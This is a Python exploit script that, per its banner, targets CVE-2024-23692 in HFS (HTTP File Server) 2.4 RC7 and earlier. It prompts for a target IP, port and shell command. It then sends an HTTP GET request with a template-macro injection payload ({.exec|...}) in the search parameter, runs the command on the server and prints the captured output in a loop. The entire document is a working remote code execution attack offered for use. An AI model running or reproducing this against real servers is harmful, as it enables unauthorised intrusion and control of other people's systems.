import socket,re
import socks
def receive_until(sock, delimiter):
    buffer = b""
    while delimiter not in buffer:
        data = sock.recv(1)
        if not data:
            break
        buffer += data
    return buffer

def receive_all(sock, length):
    buffer = b""
    while len(buffer) < length:
        data = sock.recv(length - len(buffer))
        if not data:
            break
        buffer += data
    return buffer

def main(ip,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port)) 


    cmd =input("please input cmd:")
    cmd = cmd.replace(" ","+")
    req = "GET /?n=%0A&cmd="+cmd+"&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1\r\n"
    
    
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\n"
    req += "Connection: close\r\n"
    req += "\r\n"
    
    sock.send(req.encode())
    
    headers = receive_until(sock, b"\r\n\r\n").decode()
    headers, body_delimiter = headers.split("\r\n\r\n", 1)

    content_length = 0
    for line in headers.split("\r\n"):
        if line.lower().startswith("content-length:"):
            content_length = int(line.split(":")[1].strip())
            break

    print("len:",content_length)
    body = receive_all(sock, content_length).decode('gb2312', errors='ignore')
    pattern = re.compile(r"RESULT:(.*?)====", re.DOTALL)
    match = pattern.search(body)
    
    if match:
        result_content = match.group(1).strip()
        print("Result:")
        print(result_content)
    else:
        print("Pattern not found")
        print(body)
        
    sock.close()
    

def banner():
    title ='''
   ____  __     __  _____           ____     ___    ____    _  _             ____    _____    __      ___    ____  
  / ___| \ \   / / | ____|         |___ \   / _ \  |___ \  | || |           |___ \  |___ /   / /_    / _ \  |___ \ 
 | |      \ \ / /  |  _|    _____    __) | | | | |   __) | | || |_   _____    __) |   |_ \  | '_ \  | (_) |   __) |
 | |___    \ V /   | |___  |_____|  / __/  | |_| |  / __/  |__   _| |_____|  / __/   ___) | | (_) |  \__, |  / __/ 
  \____|    \_/    |_____|         |_____|  \___/  |_____|    |_|           |_____| |____/   \___/     /_/  |_____|
                                                                                                                   
'''
    print(title)
    print("hfs version <= 2.4 RC7")
    print("Github:@Tupler")
if __name__ == '__main__':
    banner()
    ip = input("ip:")
    port = int(input("port:"))
    while(True):
        main(ip,port)